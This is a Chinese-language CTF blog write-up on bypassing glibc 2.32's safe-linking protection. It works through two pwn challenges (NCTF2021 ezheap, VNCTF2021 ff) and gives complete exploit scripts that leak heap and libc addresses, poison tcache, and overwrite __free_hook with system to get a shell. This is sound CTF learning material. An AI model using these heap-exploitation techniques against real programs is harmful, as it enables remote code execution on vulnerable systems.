---
title: Safe-Linking 机制的绕过
top: 37
tags: Safe-Linking
categories:
  - 学习总结
abbrlink: 501cca6
---

### 前言

自从引入了 `tcache` 机制后，从 `2.26` 开始 `tcache poisoning` 就是一种简便的攻击方式，因为它不需要像 `fastbin attack` 利用那样对 `size` 检查较为严格，只能申请到 `malloc` 和 `setcontext` 上方的区域。篡改了 `tcache bin` 中堆块的 `next` 指针就相当于可以任意地址申请了

### safe-Linking

在 `2.32` 之前 `tcache poisoning` 可以说是无往不利，但到了 `glibc 2.32` 及以后，增加了 `safe-Linking` 机制。 `safe-Linking` 就是对 `next` 指针进行了一些运算

规则是将 **当前 `free` 后进入 `tcache bin` 堆块的用户地址** 右移 `12` 位的值和 **当前 `free` 后进入 `tcache bin` 堆块原本正常的 `next` 值** 进行**异或** ，然后将这个值重新写回 `next` 的位置

```text
#define PROTECT_PTR(pos, ptr) \
((__typeof (ptr)) ((((size_t) pos) >> 12) ^ ((size_t) ptr)))
```



触发这个 `PROTECT_PTR` 宏，有两种情况，第一种是当前 `free` 的堆块是第一个进入 `tcache bin` 的（此前 `tcache bin` 中没有堆块），这种情况原本 `next` 的值就是 `0` ，第二种情况则是原本的 `next` 值已经有数据了。**如果是第一种情况的话，对于 `safe-Linking` 机制而言，可能并没有起到预期的作用，因为将当前堆地址右移 `12` 位和 `0` 异或，其实值没有改变，如果我们能泄露出这个运算后的结果，再将其左移 `12` 位就可以反推出来堆地址，如果有了堆地址之后，那我们依然可以篡改 `next` 指针，达到任意地址申请的效果** 



恢复 `next` 的宏为 `#define REVEAL_PTR(ptr)  PROTECT_PTR (&ptr, ptr)` ，其实这个宏最终还是调用了 `PROTECT_PTR` ，原理就是 `A=B^C ; C=A^B` 



### 例题

#### NCTF2021-ezheap

[题目链接]([NCTF2021/Pwn/ezheap at main · X1cT34m/NCTF2021 (github.com)](https://github.com/X1cT34m/NCTF2021/tree/main/Pwn/ezheap))

本题的 `libc` 版本为 `2.32`，因为是本地复现，所以我就随便选了一个 `2.32` 的小版本来做了

##### 保护策略：

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303191044578.png" alt="image-20230319104415444" style="zoom:67%;" />

##### 漏洞所在：

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303191044228.png" alt="image-20230319104447181" style="zoom:50%;" />

在 `delete` 函数中，发现 `free` 掉 `malloc_store[index]` 后将 `size_store[index]` 给置空了，由于忘记给 `malloc_store[index]` 造成了 `UAF` 。

因为本题有 `edit` 和 `show` 函数，所以篡改 `next` 以及泄露堆地址和 `libc` 地址都较为轻松



##### 利用思路：

###### edit-after-free

考虑一点就是 `delete` 函数后会将 `size[index]` 置空，如果直接 `edit` 的话，无法往里面写入数据。采取的措施是 先申请 `chunk1` 然后将其释放，此时它的 `size` 被置空了，但是地址依然留在了 `malloc_store` 里面，此时再申请等大的 `chunk2`，此时再次释放 `chunk1` （因为刚刚的 `chunk2` 是将原本的 `chunk1` 申请出来了，所以这里不会造成 `double free`），此时 `chunk1` 和 `chunk2` 指向的地址是相同的，`chunk1` 的 `size` 为 `0`， `chunk2` 的 `size` 正常，并且编辑 `chunk2` 就可以篡改已经处于 `free` 状态的 `chunk1`，从而修改其 `next` 指针。（如下图）

通过下图可以发现，此时 `0x000055d5f6e622a0` 的位置是有两个，第二个对应的 `size` 是 `0x70`，所以可以在这里篡改 `next` 指针

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303191104276.png" alt="image-20230319110417830" style="zoom: 67%;" />



###### 泄露堆地址

此时的 `tcache bin` 中只有一个堆块，执行 `show` 函数泄露其 `next` 指针数据，得到了 `0x551dcbb2` ，我们将其左移 `12` 位即可得到堆地址（因为 `next` 原本为 `0`，和 `0` 异或结果不变）

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303191109678.png" alt="image-20230319110941492" style="zoom:50%;" />

```python
heap_base=u64(p.recv(6).ljust(8,b'\x00'))<<12
```

此时即可得到堆地址（如下）

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303191113663.png" alt="image-20230319111330505" style="zoom:50%;" />



###### tcache poisoning

最后一点需要考虑的是如何将 `__free_hook` 写入到 `next` 指针上。

因为 `safe_Linking` 机制会存放 `next` 指针运算后的结果，因此 `tcache poisoning` 只需要我们自己将 `__free_hook` 地址进行同样方法运算写入 `next` 位置（如下）

```py
value=((heap_base+0x2a0)>>12)^free_hook
```

`heap_base+0x2a0` 是当前 `free` 后进入 `tcache bin` 堆块的用户地址

此时 `__free_hook` 写入 `next` 后的情况如下

![image-20230319115455792](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303191154909.png)

![image-20230319115549446](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303191155547.png)



最后将 `__free_hook` 申请出来写入 `system` 地址，通过 `free` 释放掉一个存有 `/bin/sh` 字符串的堆块，获取 `shell`。

**注意：** 需要提前布局 `0x80` 这条链的堆块，保证其 `counts` 在申请 `__free_hook` 时要大于 `0`，否则无法从这条 `tcache bin` 中申请出来 `__free_hook`



##### EXP

[tools源码](https://zikh26.github.io/posts/ad411136.html)

```py
from tools import*
#context.log_level='debug'
def add(size,content):
    p.sendlineafter(">> ",str(1))
    p.sendlineafter("Size: ",str(size))
    p.sendlineafter("Content: ",content)
    
def edit(index,content):
    p.sendlineafter(">> ",str(2))
    p.sendlineafter("Index: ",str(index))
    p.sendlineafter("Content: ",content)
    
def show(index):
    p.sendlineafter(">> ",str(4))
    p.sendlineafter("Index: ",str(index))
    
def delete(index):
    p.sendlineafter(">> ",str(3))
    p.sendlineafter("Index: ",str(index))

p,e,libc=load("ezheap")
add(0x70,'a'*0x10)#0
add(0x70,'b'*0x10)#1
delete(0)

show(0)#leak heap_address

heap_base=u64(p.recv(6).ljust(8,b'\x00'))<<12
log_addr('heap_base')
add(0x70,'b')#2
delete(1)
delete(0)

for i in range(8):
    add(0x80,'s')
add(0x10,'preven chunk')
for i in range(3,11):
    delete(i)

delete(11)#goto unsorted bin

show(10)#leak libc
libc_base=recv_libc()-0x1e3c00
log_addr('libc_base')
free_hook=libc_base+libc.symbols['__free_hook']
sys_addr=libc_base+libc.symbols['system']

value=((heap_base+0x2a0)>>12)^free_hook

debug(p,'pie',0x1769,0x172A,0x1754,0x173F)
edit(2,p64(value))

add(0x70,'/bin/sh\x00')
add(0x70,p64(sys_addr))
delete(12)
p.interactive()
```

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303191159819.png" alt="image-20230319115958381" style="zoom: 50%;" />







#### VNCTF2021-ff

题目附件在 BUUCTF 中的 VNCTF2021 比赛中可以找到

##### 保护策略

![image-20230320140126119](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303201401195.png)



##### 程序分析

`libc` 为 `2.32-0ubuntu3_amd64` ，这个版本存在 `safe-Linking` 机制



`add` 函数，对 `size` 进行了限制，最大能申请 `0x7f` ,并且申请出来的堆块索引会被赋值为全局变量 `idx` ，最多申请 `0x10` 个堆块

`delete` 函数存在 `UAF` 漏洞，但是我们无法选择索引释放指定的堆块，只能释放索引为 `idx` 的堆块（也就是只能释放最近一次申请的堆块）

`show` 函数也是只能打印出最近一次申请堆块中的八个字节数据，并且 `show` 函数只有一次执行的机会 

`edit` 函数只能向最近一次堆块中写入 `0x10` 字节的数据，并且 `edit` 函数只能执行两次



##### 利用思路

因为本题一个麻烦的点在于 `edit` `show` `delete` 函数都只能对最近一个申请出来的堆块操作，所以需要反复调试进行一个布局。

`add` 函数最大申请 `0x80` 的堆块，这就导致了泄露 `libc` 地址泄露不出来（即使填满 `tcache bin` 因为还需要做一个阻止与 `top chunk` 合并的堆块，也是无法将 `libc` 泄露出来的，就算真的泄露出来还要考虑 `safe-Linking` ）

所以这里最终选择的是泄露 `heap` 地址，利用 `UAF` 加上 `show` 函数即可泄露堆地址（将泄露出来的数据左移 `12` 位）

需要注意的是 `edit` 函数可以写入 `0x10` 个字节的数据，这样可以篡改 ` free` 状态堆块的 `key` 字段，给了我们 `double free` 的机会，目的是去将 `pthread_tcache_struct` 申请出来（此时两次 `edit` 机会已经用完）



之后泄露 `libc` 肯定要考虑残留一个 `main_arena+96` 地址，然后爆破申请 `_IO_2_1_stdout_` 结构体泄露 `libc` 。本题堆块即使填满 `tcache bin` 也会落入 `fast bin` 中（`0x90` 虽然落不进去，但产生了 `main_arena+96` 也没办法改为 `_IO_2_1_stdout_` 地址）

所以只能将 `pthread_tcache_struct` 释放掉进入 `unsorted bin` ，当我们每次去从 `unsorted bin` 中切割堆块的时候，都会残留 `main_arena+96` 在 `pthread_tcache_struct` 中，当 `main_arena+96` 正好落到 `tcache` 头指针的位置，我们再切割 `unsorted bin` 的时候就能篡改 `main_arena+96` 改为 `_IO_2_1_stdout` 地址了。

注意：从 `tcache bin` 中申请堆块出来需要保证 `counts > 0` ，为了最后还有机会做一个 `__free_hook` 申请出来，我们必须让申请出来的堆块尽可能小（在后面堆块布局的时候就会发现这点）



##### 调试过程

调试过程主要演示如何将 `__IO_2_1_stdout` 和 `__free_hook` 申请出来

下图是申请 `pthread_tcache_struct` 前的情况，申请出来要写入 `b'\x00\x00' * 0x27 + b'\x07\x00'` ，这样正好将 `0x290` 这条链的 `counts` 设置为 `7`，保证了释放掉 `pthread_tcache_struct` 后可以进入 `unsorted bin`

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303202028776.png" alt="image-20230320202839431" style="zoom: 50%;" />



下图是 `pthread_tcache_struct` 进入了 `unsorted bin` ，接下来我们需要反复从 `unsorted bin` 里来切堆块

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303202032910.png" alt="image-20230320203243312" style="zoom:50%;" />



我们第一个要切下来的堆块大小为 `0x40`，写入的数据为 `'\x00\x00'*3+'\x01\x00'*1+'\x00\x00'*2+'\x01\x00'+'\x00'*0x38` ，这样才可以让 `0x50` 和 `0x80` 这两条链上的 `counts` 为 `1`（如下图）（这里就是一个布局，为后面申请 `_IO_2_1_stdout` 和 `__free_hook` 做准备）

自己做题的时候，这里肯定不是第一次就能写出来的，等调试到后面发现这里需要构造 `counts` ，才拐回来布置的，包括申请的堆块大小为 `0x40` 也是反复调试更改后确定的。总结一下就是这些数据都是调试得来的。

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303202035978.png" alt="image-20230320203552375" style="zoom:50%;" />



再次申请一个 `0x30` 堆块，这次发送的数据全部填写 `\x00` 即可，此时 `pthread_tcache_struct` 中已经残留了被切割后的 `main_arena+96` （如下图）

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303202041239.png" alt="image-20230320204130712" style="zoom:50%;" />



申请一个 `0x10` 的堆块，写入数据为 `\xc0\x16` （这是 `_IO_2_1_stdout_` 的后两字节，不过第一位需要爆破），写入的数据会正好落在刚刚残留的 `main_arena+96` 上，从而产生了 `_IO_2_1_stdout_` 地址，并且 `0x50` 这条链的 `counts` 已经被设置为 `1`  了，所以是可以申请出来的（如下图）

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303202045688.png" alt="image-20230320204516358" style="zoom:50%;" />



`io leak` 就不说了 此处`exp` 的代码为 

```py
add(0x40,p64(0xfbad1887)+p64(0)*3+b'\x00')
```

 具体做法请参考 [文章](https://zikh26.github.io/posts/a9dd00f0.html) ，现在我们已经拿到了 `libc` 地址并且 `bins` 的情况如下

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303202052487.png" alt="image-20230320205222092" style="zoom:50%;" />



申请一个 `0x10` 的堆块，写入 `__free_hook` 的地址，该地址会正好落在 `0x80` 的 `tcache` 头（如下），`__free_hook` 为什么会正好落在这里？   别问，问就是布局 ◕‿◕

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303202055913.png" alt="image-20230320205508486" style="zoom:50%;" />



因为之前已经将 `0x80` 这条链的 `counts` 设置为 `1`，所以可以直接将 `__free_hook` 申请出来，然后写入 `system` 地址。然后观察 `0x20` 这条链是没有任何数据的，我们就可以申请一个 `0x20` 的堆块存入 `/bin/sh` 再将其释放，即可获取 `shell`



本题注意的几点：

1. 很多看似顺理成章的布局，其实都是反复调试出来的
2. `counts` 为 `0` 的时候，从 `tcache bin` 中申请不出来堆块
3. `counts` 大于 `0` 的时候，如果里面的值不是一个合法地址，则申请时会报错
4. 为了打最后的 `tcache poisoning` ，必须要让每次申请堆块的 `size` 尽可能的小，这样才能让 `__free_hook` 落在 `0x80` ，再往后的话因为对 `add` 函数中对  `size` 检查的原因，就申请不出来了
5. 往 `pthread_tcache_struct` 中写入数据时，尽可能的写入 `\x00` ，不然可能会破坏某些 `tcache bin` 的 `counts` 



##### EXP

[tools源码](https://zikh26.github.io/posts/ad411136.html)

```py
from tools import*
#context.log_level='debug'
p,e,libc=load("pwn","node4.buuoj.cn:26738")
def add(size,content):
    p.sendlineafter(">>",str(1))
    p.sendlineafter("Size:\n",str(size))
    p.sendafter("Content:\n",content)
    
def delete():
    p.sendlineafter(">>",str(2))
    
def show():
    p.sendlineafter(">>",str(3))
    
def edit(content):
    p.sendlineafter(">>",str(5))
    p.sendafter("Content:\n",content)


add(0x70,'a')
delete()

show()
heap_base=u64(p.recv(6).ljust(8,b'\x00'))<<12
log_addr('heap_base')


edit('b'*0x10)
delete()

edit(p64(((heap_base+0x2a0)>>12)^(heap_base+0x10)))
add(0x70,'a')

add(0x70, b'\x00\x00' * 0x27 + b'\x07\x00')

delete()

add(0x40,'\x00\x00'*3+'\x01\x00'*1+'\x00\x00'*2+'\x01\x00'+'\x00'*0x38)

add(0x30,b'\x00'*0x18+p64(0xdeadbeef))

add(0x10,'\x00'*8+'\xc0\x16')

#delete()

add(0x40,p64(0xfbad1887)+p64(0)*3+b'\x00')
libc_base=recv_libc()-0x1e4744
log_addr('libc_base')
debug(p,'pie',0xE86,0xE6D,0xE5E,0xED5)
add(0x10,p64(libc_base+libc.symbols['__free_hook']))
add(0x70,p64(libc_base+libc.symbols['system']))

add(0x10,'/bin/sh\x00')
delete()
p.interactive()
```

![image-20230320135639350](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303201357465.png)





